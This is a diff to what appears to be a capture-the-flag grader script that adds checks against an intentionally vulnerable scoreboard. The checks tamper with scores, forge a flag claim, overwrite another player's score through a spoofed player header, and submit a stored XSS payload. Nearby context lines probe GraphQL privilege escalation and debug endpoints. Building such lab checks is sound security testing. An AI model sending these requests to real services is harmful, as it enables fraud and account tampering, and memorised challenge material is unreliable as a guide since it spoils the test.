@@ -256,6 +256,15 @@ ok(71, 'gql_batch_privesc', (await txt('/graphql', J({ query: 'mutation { a:mint
 { const e = (await txt('/api/debug/eval')).body; const k = (await txt('/api/internal/rotate-keys')).body;
   ok('Ω', 'abstain_gauntlet', !e.includes('FLAG{') && !k.includes('FLAG{')); }
 
+// ─────────────────────── v12 HACK THE SCOREBOARD ───────────────────────
+const P = (o) => ({ method: 'POST', headers: { 'content-type': 'application/json', 'x-player': 'grader' }, body: JSON.stringify(o) });
+ok('S1', 'scoreboard_score_tamper', (await txt('/api/score/set', P({ player: 'grader', score: 9999 }))).body.includes('lj_scoreboard_score_tamper'));
+ok('S2', 'scoreboard_flag_forgery', (await txt('/api/score/claim', P({ player: 'grader', flag: 'FLAG{lj_black_team}' }))).body.includes('lj_scoreboard_flag_forgery'));
+ok('S3', 'scoreboard_idor', (await txt('/api/score/set', { method: 'POST', headers: { 'content-type': 'application/json', 'x-player': 'attacker' }, body: JSON.stringify({ player: 'victim', score: 1 }) })).body.includes('lj_scoreboard_idor_overwrite'));
+ok('S4', 'scoreboard_xss', (await txt('/api/score/claim', P({ player: 'grader', name: '<img src=x onerror=1>' }))).body.includes('lj_scoreboard_stored_xss'));
+// punchline: grader fraudulently at 100% but server emitted nothing → verify catches it
+ok('S5', 'scoreboard_pwned', (await txt('/api/score/verify?player=grader')).body.includes('lj_scoreboard_pwned'));
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
